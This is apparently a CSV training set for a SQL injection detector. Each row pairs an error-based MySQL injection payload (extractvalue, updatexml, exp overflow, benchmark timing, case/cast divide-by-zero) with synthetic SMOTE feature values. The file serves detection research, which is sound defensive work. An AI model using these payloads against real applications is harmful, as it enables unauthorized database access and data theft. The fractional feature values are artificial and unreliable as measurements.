id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000145,attack,error,"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000237,0.13246772444639737,178.8320700036428,31.844276000485706,3.8236512934258062,43.53282800145712,47.0,66.37710400194283,21.922138000242853,0.24334336565999995,0.2629593504992858,0.37108181919547617,0.1226154646452381,0.0,0.0,2.0,0.0,0.0,2.0,0.0,11.922138000242853,2.7755575615628914e-17,0.0,6.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000146,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm",nearest_attack_euclidean,R000295,0.11395715633846398,160.60273525356942,29.939726474643056,3.849787346254318,47.0,35.0,57.482188202855546,21.120547050713885,0.29270850893684697,0.2179744215487158,0.3578233162868908,0.13149375322754647,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.120547050713887,2.7755575615628914e-17,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000147,attack,error,"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000092,0.3180786908620819,176.7897212068888,31.744325541873028,3.855820875054786,48.0,43.0,64.53404674876182,21.255674458126972,0.27158848923294626,0.24329802160451433,0.3648887204081421,0.12022476875439733,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.255674458126972,2.7755575615628914e-17,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000148,attack,error,"1   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   5524  =  5524",nearest_attack_euclidean,R000037,0.44581718998241465,181.0,27.0,3.5380891914599837,38.24716345729958,45.33711539026723,75.83144230486639,21.584278847566807,0.21131029534419654,0.250481300498714,0.4189582447782673,0.11925015937882213,0.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,2.7755575615628914e-17,0.0,5.584278847566807,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000149,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",nearest_attack_euclidean,R000102,1.0380488091237794,177.44052557276166,27.53146611234012,3.609265388674561,47.0,35.0,71.37759334808142,24.062932224680235,0.26529077039898347,0.19755695668009407,0.4015523243908035,0.13559994853011897,4.0,0.0,0.0,0.0,0.0,2.0,0.0,13.062932224680235,2.7755575615628914e-17,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000150,attack,error,"1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000115,0.32479761557364334,184.67963301901864,31.339816509509316,3.8640035319545643,50.98055047147205,44.35926603803727,66.0,23.33981650950932,0.27609514871908275,0.2401496239826162,0.3573849994373764,0.12637022786092467,2.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,5.339816509509317,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000151,attack,error,"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000293,0.10598908221659002,192.0,32.0,3.67213166142711,48.96827074981904,40.0,79.0,24.03172925018096,0.25504307682197414,0.20833333333333334,0.4114583333333333,0.12516525651135918,0.03172925018096051,0.0,2.0,0.0,1.0,2.0,0.0,14.0,2.7755575615628914e-17,0.0,4.0,5.0,0.03172925018096062,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.9682707498190395,0.03172925018096062,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000152,attack,error,"1'||  (  select 'qued' where 9801  =  9801 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000195,0.1863681359987168,185.0576945071347,37.82691647859593,4.075535419204924,64.59613845005717,31.346167042808137,65.02884725356735,24.086541760702033,0.34908326261878375,0.16936702914289145,0.3513972134396937,0.13015249479863114,3.0288472535673443,0.0,0.0,0.0,0.0,1.0288472535673445,0.0,12.971152746432656,2.7755575615628914e-17,0.0,4.028847253567345,3.0865417607020333,1.0,0.0,0.0,0.9711527464326555,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0288472535673445,0.0,1.0,0.0,0.0,0.028847253567344522,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9711527464326557,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.028847253567345
SMOTE_000153,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000210,0.5542113830560513,166.17594234020896,26.782405765979103,3.416300501094443,41.435188468041794,31.217594234020897,72.30556540412539,21.217594234020897,0.24937472921258363,0.1879111032321611,0.435016148728684,0.1276980188265713,0.0,0.0,0.0,0.0,1.0,1.0,0.0,14.217594234020897,2.7755575615628914e-17,0.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.2175942340208975,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.217594234020898
SMOTE_000154,attack,error,"1""  )   as sstd where 9629  =  9629 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000193,0.9255113465551627,168.02307291692136,32.160945512898884,3.8824792151788152,42.86212740402249,44.839054487101116,59.32189102579777,21.0,0.25444155569374627,0.26772340063282557,0.3526649334162478,0.1251701102571804,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.540236378224721,2.7755575615628914e-17,0.0,5.459763621775279,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000155,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000257,0.7478007616437014,139.6977800964542,26.697780096454217,3.6880297637209756,37.0,35.0,51.0,16.697780096454217,0.2648603358906061,0.25054356097760033,0.3650777602816462,0.1195183428501474,0.0,0.6977800964542151,0.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.0,1.0,0.0,0.6977800964542151,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'vvkl'  =  'vvkl",nearest_attack_euclidean,R000212,0.09012889695187785,160.0,27.759201132421722,3.8469028042217843,44.0,39.0,55.0,22.0,0.275,0.24375,0.34375,0.1375,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.7755575615628914e-17,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000157,attack,error,"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000199,0.4345427178482576,149.13159388643166,33.19674256602055,3.886047690337309,52.55765335826722,23.0,55.37719796214389,18.196742566020554,0.3516526814552208,0.1546727603079382,0.37144111485847753,0.12223344337836355,1.0,0.0,0.0,0.0,0.0,0.0,0.0,12.196742566020555,2.7755575615628914e-17,0.0,4.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000158,attack,error,"1""  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000136,0.33496599107836306,168.99002593665404,29.398670124887204,3.7255788401240357,42.19601037466162,43.0,62.59468049954882,21.199335062443602,0.24951563132500207,0.2547570020875949,0.37020985757802066,0.12551750900938238,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.199335062443602,2.7755575615628914e-17,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000159,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf",nearest_attack_euclidean,R000205,0.37143701258041284,161.0,29.407252074246315,3.8830122215162968,47.11087811136947,36.18549585150737,56.407252074246315,21.296373962876842,0.29261414976005884,0.2247546326180582,0.3503556029456293,0.13227561467625368,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.7755575615628914e-17,0.0,5.296373962876843,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000160,attack,error,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zlxw'  =  'zlxw",nearest_attack_euclidean,R000177,0.15041729217516495,165.85258401899512,32.0,3.8709307334302316,60.0,24.0,60.6820672151961,21.170516803799025,0.36186476048001015,0.14474590419200403,0.36576228742398786,0.12762704790399795,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.170516803799025,2.7755575615628914e-17,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000161,attack,error,"1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000125,0.7036337428546524,183.27288226364414,31.72711773635588,3.855705924124565,51.27288226364412,43.0,66.0,23.0,0.27975826974343737,0.23462420000781964,0.3601208651282813,0.12549666512046168,2.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.27288226364412077,0.7271177363558793,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000162,attack,error,"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000027,0.29973707806551597,167.59772202978561,29.51954440595712,3.771463425845902,41.51954440595712,43.69272587460949,62.03908881191424,20.346362937304747,0.24778512537918232,0.26069352599426887,0.37013429663801106,0.12138705198853775,0.0,0.0,2.0,0.0,0.0,2.0,0.0,11.173181468652373,2.7755575615628914e-17,0.0,5.173181468652373,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000163,attack,error,"1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000297,0.10084708747197929,164.0462636290054,35.953736370994584,3.976926393685049,55.0,31.0,60.0,18.046263629005416,0.33527182189226545,0.18897139052109505,0.3657510784279259,0.11000570915871362,0.04626362900541525,0.0,0.0,0.0,0.0,1.0,0.0,12.0,2.7755575615628914e-17,0.0,4.0,1.0,0.04626362900541531,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000164,attack,error,"1   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   3626  =  3626",nearest_attack_euclidean,R000117,0.39209444786346065,178.6395666436269,27.0,3.528342677729652,40.0,43.0,74.97677140882305,20.66279523480384,0.22411808430393104,0.2409269406267259,0.4193121710205347,0.11564280404880836,0.0,0.0,0.0,0.0,0.0,2.0,0.0,13.662795234803843,2.7755575615628914e-17,0.0,5.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000165,attack,error,"1%""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000301,0.6073925888513608,178.76612789429396,27.76612789429397,3.5012785616281827,39.76612789429397,35.0,77.0,27.0,0.22244340522587602,0.19578763177765712,0.4307327899108456,0.15103617308562123,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,14.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.76612789429397,0.23387210570602984,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000166,attack,error,"1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",nearest_attack_euclidean,R000235,2.39283140274173,186.0,29.0,3.565162101887027,47.0,32.0,79.0,28.0,0.25268817204301075,0.17204301075268819,0.42473118279569894,0.15053763440860216,2.036872869846466,1.963127130153534,0.0,0.0,1.0,2.0,0.0,14.0,2.0,0.0,4.0,3.0,0.5092182174616164,0.49078178253838356,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000167,attack,error, (  select   (  case when   (  6461  =  1802  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,nearest_attack_euclidean,R000103,0.0660003555380583,136.0,26.804871429249946,3.525719210541233,56.0,11.0,57.0,12.0,0.4117647058823529,0.08088235294117647,0.41911764705882354,0.08823529411764706,0.0,0.0,0.0,1.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000168,attack,error,"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000302,0.09347859757099872,144.64729918244905,26.070540163510188,3.661191521326815,34.21162049053057,38.71783934595924,52.85891967297962,18.85891967297962,0.23658506398638746,0.26762768655411706,0.36543036925676087,0.13035688020273464,1.0,0.0,0.0,0.0,0.0,1.0,0.0,10.92945983648981,2.7755575615628914e-17,0.0,5.92945983648981,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000169,attack,error,"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp",nearest_attack_euclidean,R000024,0.1253510374695592,183.25705860984618,28.053067242153844,3.5793329052340694,47.0,35.0,76.36319309415389,24.893865515692315,0.25655109479978355,0.19104868761686009,0.4165611897815268,0.13583902780182963,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,13.893865515692314,2.7755575615628914e-17,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000170,attack,error,select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000073,0.010805307665903197,133.0,28.0,3.72534198486376,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000171,attack,error,"1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",nearest_attack_euclidean,R000109,0.28028731536071855,184.49536584041937,30.504634159580647,3.852563755898616,48.75695123937097,45.99073168083871,66.0,23.747682920209677,0.26431128102033674,0.2492394968676843,0.35774053624375496,0.12870868586822407,2.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,5.747682920209677,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000172,attack,error,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000164,1.7455900167697251,188.0,32.21412213501122,3.899014194547663,49.64236640503367,46.14351145995511,66.0,26.214122135011223,0.26405514045230677,0.24544420989337823,0.35106382978723405,0.13943681986708098,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,5.785877864988777,4.428244270022447,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.21412213501122382,2.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000173,attack,error,"1  )   where 9059  =  9059 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000215,0.2557779746910185,167.66287190663803,29.207858988329754,3.791763493626554,42.623576964989255,43.83143595331901,61.0,20.207858988329754,0.2541778547330501,0.26133897231219777,0.3639580672238984,0.1205251057308537,0.0,0.0,2.0,0.0,0.0,2.0,0.0,11.0,2.7755575615628914e-17,0.0,5.207858988329753,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
